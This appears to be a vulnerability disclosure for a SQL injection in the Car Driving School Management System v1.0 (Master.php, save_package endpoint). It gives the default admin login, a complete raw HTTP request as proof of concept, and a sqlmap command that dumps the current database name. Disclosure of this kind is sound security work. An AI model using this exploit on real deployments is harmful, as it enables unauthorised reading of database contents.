### SQL injection vulnerability exists in Sourcecodester Car Driving School Management System

official website:https://www.sourcecodester.com/php/15070/car-driving-school-management-system-phpoop-free-source-code.html

version:v1.0

route:/cdsms/classes/Master.php?f=save_package

related code file:Master.php

injection parameter:${'id'}

#### 1.Vulnerability analysis

After receiving the id parameter passed in through the get method in the Master.php file, it is directly spliced into the SQL query statement for execution without any security filtering. An attacker can use this parameter to perform SQL injection to read arbitrary database information.

![image-20240725213419541](assets/image-20240725213419541.png)

#### 2.Vulnerability verification and exploit

After admin/admin123 logs in to the system backend, replace the cookie content in the following POC and save it as 1.txt.Note that you need to modify the deployed IP address, port, and cookie information in the data packet according to the environment.

```
POST /cdsms/classes/Master.php?f=save_package HTTP/1.1
Host: localhost
Content-Length: 623
sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryB7VEBVesDWBK38N3
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/cdsms/admin/?page=packages
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_f8cddee34ca21f05373a9388cfdd798b=1721700678; PHPSESSID=32r6u9afm833p0abeg632sl4id
Connection: close

------WebKitFormBoundaryB7VEBVesDWBK38N3
Content-Disposition: form-data; name="id"


------WebKitFormBoundaryB7VEBVesDWBK38N3
Content-Disposition: form-data; name="name"

123
------WebKitFormBoundaryB7VEBVesDWBK38N3
Content-Disposition: form-data; name="description"

123
------WebKitFormBoundaryB7VEBVesDWBK38N3
Content-Disposition: form-data; name="training_duration"

123
------WebKitFormBoundaryB7VEBVesDWBK38N3
Content-Disposition: form-data; name="cost"

120
------WebKitFormBoundaryB7VEBVesDWBK38N3
Content-Disposition: form-data; name="status"

0
------WebKitFormBoundaryB7VEBVesDWBK38N3--

```

python sqlmap.py -r 1.txt --batch --current-db

![image-20240725213222464](assets/image-20240725213222464.png)

Successfully obtained the injected payload and database name.